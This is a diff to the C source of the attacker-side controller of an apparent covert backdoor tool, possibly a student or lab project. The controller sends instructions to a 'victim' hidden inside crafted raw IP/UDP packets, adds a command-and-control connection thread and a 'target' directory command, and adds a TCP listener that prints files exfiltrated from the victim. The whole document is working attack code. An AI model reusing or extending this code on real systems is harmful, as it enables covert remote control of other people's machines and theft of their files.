@@ -8,7 +8,7 @@ int main(void) {
     bpf_u_int32 netp, maskp;
     pcap_t* nic_fd;
     struct bpf_program fp;
-    pthread_t udp_thread, tcp_thread;
+    pthread_t udp_thread, tcp_thread, cnc_thread;
 
     check_root_user();
     signal(SIGINT,sig_handler);
@@ -22,12 +22,17 @@ int main(void) {
 
 
     if (pthread_create(&udp_thread, NULL, udp_select_call, (void*)&opts) != 0) {
-        perror("pthread_create error");
+        perror("udp thread create error");
         exit(EXIT_FAILURE);
     }
 
-    if (pthread_create(&tcp_thread, NULL, cvc_checker, (void*)&opts) != 0) {
-        perror("pthread_create error");
+    if (pthread_create(&tcp_thread, NULL, tcp_select_call, (void*)&opts) != 0) {
+        perror("tcp thread create error");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pthread_create(&cnc_thread, NULL, cnc_checker, (void*)&opts) != 0) {
+        perror("cnc thread_create error");
         exit(EXIT_FAILURE);
     }
 
@@ -91,14 +96,14 @@ void create_attacker_udp_socket(struct options_attacker *opts, struct sockaddr_i
     int enable = 1;
     memset(victim_address, 0, sizeof(struct sockaddr_in));
 
-    opts->attacker_socket_udp = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    opts->udp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
-    if (opts->attacker_socket_udp == -1) {
+    if (opts->udp_socket == -1) {
         perror("socket() ERROR\n");
         exit(EXIT_FAILURE);
     }
 
-    if (setsockopt(opts->attacker_socket_udp, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
+    if (setsockopt(opts->udp_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
         perror("Error setting IP_HDRINCL option");
         exit(EXIT_FAILURE);
     }
@@ -106,7 +111,7 @@ void create_attacker_udp_socket(struct options_attacker *opts, struct sockaddr_i
 
     // VICTIM SERVER
     victim_address->sin_family = AF_INET;
-    victim_address->sin_port = htons(DEFAULT_PORT);
+    victim_address->sin_port = htons(DEFAULT_UDP_PORT);
     victim_address->sin_addr.s_addr = inet_addr(opts->victim_ip);
 
 
@@ -133,7 +138,7 @@ void get_my_ip(char *nic_interface, struct options_attacker *opts) {
 
 unsigned short create_udp_header(struct udphdr* uh) {
     uh->source = htons(generate_random_port());
-    uh->dest = htons(DEFAULT_PORT);
+    uh->dest = htons(DEFAULT_UDP_PORT);
     uh->len = htons(sizeof(struct udphdr));
     uh->check = calculate_checksum(&uh, sizeof(struct udphdr));
 
@@ -196,9 +201,12 @@ void* udp_select_call(void* arg) {
                     puts("============ RESULT ============");
                     if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                         opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
-                        if (strstr(opts->victim_instruction, "cvc") != NULL) {
-                            strcpy(opts->cvc_ip, opts->victim_instruction + 4);
-                            opts->cvc = TRUE;
+                        if (strstr(opts->victim_instruction, "cnc") != NULL) {
+                            strcpy(opts->cnc_ip, opts->victim_instruction + 4);
+                            opts->cnc = TRUE;
+                        }
+                        if (strstr(opts->victim_instruction, "target") != NULL ) {
+                            strcpy(opts->target_directory, opts->victim_instruction + 7);
                         }
                         sprintf(instruction, "[[%s]]", opts->victim_instruction);
                         length = strlen(instruction);
@@ -207,7 +215,7 @@ void* udp_select_call(void* arg) {
                             create_ip_header(&ih, instruction[j], opts);
                             memcpy(s_buffer, &ih, sizeof(struct iphdr));
                             memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
-                            byte = (int)sendto(opts->attacker_socket_udp, (const char*)s_buffer, SEND_SIZE, 0,
+                            byte = (int)sendto(opts->udp_socket, (const char*)s_buffer, SEND_SIZE, 0,
                                           (const struct sockaddr*)&victim_address, sizeof(victim_address));
                             if (byte < 0) {
                                 perror("send failed\n");
@@ -220,7 +228,7 @@ void* udp_select_call(void* arg) {
             }
         }
     }
-    close(opts->attacker_socket_udp);
+    close(opts->udp_socket);
     pthread_exit(NULL);
 }
 
@@ -248,45 +256,40 @@ void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
 }
 
 
-int get_max_socket_number(struct options_attacker *opts) {
-
-}
-
-
-void* cvc_checker(void* arg) {
+void* cnc_checker(void* arg) {
     struct options_attacker *opts = (struct options_attacker*)arg;
-    struct sockaddr_in cvc_address;
+    struct sockaddr_in cnc_address;
 
-    memset(&cvc_address, 0, sizeof(struct sockaddr_in));
+    memset(&cnc_address, 0, sizeof(struct sockaddr_in));
     while (1) {
-        if(opts->cvc == TRUE) break;
+        if(opts->cnc == TRUE) break;
     }
-    tcp_select_call(opts, cvc_address);
+    cnc_select_call(opts, cnc_address);
 }
 
 
-void create_attacker_cvc_socket(struct options_attacker *opts, struct sockaddr_in *cvc_address) {
-    opts->attacker_socket_tcp = socket(AF_INET, SOCK_STREAM, 0);
+void create_attacker_cnc_socket(struct options_attacker *opts, struct sockaddr_in *cnc_address) {
+    opts->cnc_socket = socket(AF_INET, SOCK_STREAM, 0);
 
-    if (opts->attacker_socket_tcp == -1) {
+    if (opts->cnc_socket == -1) {
         perror("socket() ERROR\n");
         exit(EXIT_FAILURE);
     }
 
     // VICTIM SERVER
-    cvc_address->sin_family = AF_INET;
-    cvc_address->sin_port = htons(CVC_PORT);
-    cvc_address->sin_addr.s_addr = inet_addr(opts->cvc_ip);
+    cnc_address->sin_family = AF_INET;
+    cnc_address->sin_port = htons(CNC_PORT);
+    cnc_address->sin_addr.s_addr = inet_addr(opts->cnc_ip);
 
-    if (cvc_address->sin_addr.s_addr == (in_addr_t) - 1) {
+    if (cnc_address->sin_addr.s_addr == (in_addr_t) - 1) {
         fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
     }
 }
 
 
 
-void tcp_select_call(struct options_attacker *opts, struct sockaddr_in cvc_address) {
-    char buffer[RECEIVE_SIZE] = {0};
+void cnc_select_call(struct options_attacker *opts, struct sockaddr_in cnc_address) {
+    char buffer[OUTPUT_SIZE] = {0};
 
     fd_set reads, cpy_reads;
     struct timeval timeout;
@@ -298,30 +301,20 @@ void tcp_select_call(struct options_attacker *opts, struct sockaddr_in cvc_addre
     timeout.tv_sec = 1;
     timeout.tv_usec = 0;
 
-    create_attacker_cvc_socket(opts, &cvc_address);
+    create_attacker_cnc_socket(opts, &cnc_address);
 
-    // VICTIM SERVER
-    cvc_address.sin_family = AF_INET;
-    cvc_address.sin_port = htons(CVC_PORT);
-    cvc_address.sin_addr.s_addr = inet_addr(opts->cvc_ip);
-
-
-    if (cvc_address.sin_addr.s_addr == (in_addr_t) - 1) {
-        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
-    }
-
-    sleep(2);
-    if (connect(opts->attacker_socket_tcp, (struct sockaddr*)&cvc_address,
-                sizeof(cvc_address)) < 0) {
+    sleep(1);
+    if (connect(opts->cnc_socket, (struct sockaddr*)&cnc_address,
+                sizeof(cnc_address)) < 0) {
         printf("connect() failed\n");
         exit(1);
     }
 
     FD_ZERO(&reads);
-    FD_SET(opts->attacker_socket_tcp, &reads);
+    FD_SET(opts->cnc_socket, &reads);
 
 
-    fd_max = opts->attacker_socket_tcp;
+    fd_max = opts->cnc_socket;
 
     while (1) {
         cpy_reads = reads;
@@ -333,12 +326,11 @@ void tcp_select_call(struct options_attacker *opts, struct sockaddr_in cvc_addre
         else if (fd_num == 0) continue; // time out
         for (int i = 0; i < fd_max + 1; i++) {
             if (FD_ISSET(i, &cpy_reads)) {
-                if (opts->attacker_socket_tcp != 0) {
-                    if (i == opts->attacker_socket_tcp) {
-                        if (read(opts->attacker_socket_tcp, buffer, 256) > 0) {
-                            printf("[ CVC SERVER ]: %s\n", buffer);
-                            memset(buffer, 0, sizeof(char) * 256);
-                        }
+                if (opts->cnc_socket != 0) {
+                    if (i == opts->cnc_socket) {
+                        read(opts->cnc_socket, buffer, OUTPUT_SIZE);
+                        printf("[ CVC SERVER ]: %s\n", buffer);
+                        memset(buffer, 0, sizeof(char) * OUTPUT_SIZE);
                     }
                 }
             }
@@ -347,3 +339,74 @@ void tcp_select_call(struct options_attacker *opts, struct sockaddr_in cvc_addre
 }
 
 
+void* tcp_select_call(void* arg) {
+    struct options_attacker *opts = (struct options_attacker *) arg;
+    struct sockaddr_in victim_address;
+    int byte;
+    char buffer[OUTPUT_SIZE] = {0};
+
+    fd_set reads, cpy_reads;
+    struct timeval timeout;
+    int fd_max, fd_num;
+
+    size_t length = 0;
+
+    timeout.tv_sec = 0;
+    timeout.tv_usec = 200;
+
+    create_attacker_tcp_socket(opts, &victim_address);
+
+    if (connect(opts->tcp_socket, (struct sockaddr*)&victim_address,
+                sizeof(victim_address)) < 0) {
+        printf("tcp connect() failed\n");
+        exit(1);
+    }
+
+
+    FD_ZERO(&reads);
+    FD_SET(opts->tcp_socket, &reads);
+
+    fd_max = opts->tcp_socket;
+
+    while (1) {
+        cpy_reads = reads;
+        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
+        if (fd_num == -1) {
+            perror("Select() failed");
+            exit(EXIT_FAILURE);
+        }
+        else if (fd_num == 0) continue; // time out
+        for (int i = 2; i < fd_max + 1; i++) {
+            if (FD_ISSET(i, &cpy_reads)) {
+                if (i == opts->tcp_socket) {
+                    read(opts->tcp_socket, buffer, sizeof(buffer));
+//                    setvbuf(stdout, NULL, _IONBF, 0);
+//                    setvbuf(stderr, NULL, _IONBF, 0);
+                    printf("FILE: \n%s", buffer);
+                    memset(buffer, 0, sizeof(buffer));
+                }
+            }
+        }
+    }
+    close(opts->udp_socket);
+    pthread_exit(NULL);
+}
+
+
+void create_attacker_tcp_socket(struct options_attacker *opts, struct sockaddr_in *tcp_address) {
+    opts->tcp_socket = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (opts->tcp_socket == -1) {
+        perror("socket() ERROR\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // VICTIM SERVER
+    tcp_address->sin_family = AF_INET;
+    tcp_address->sin_port = htons(DEFAULT_TCP_PORT);
+    tcp_address->sin_addr.s_addr = inet_addr(opts->victim_ip);
+
+    if (tcp_address->sin_addr.s_addr == (in_addr_t) - 1) {
+        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+    }
+}
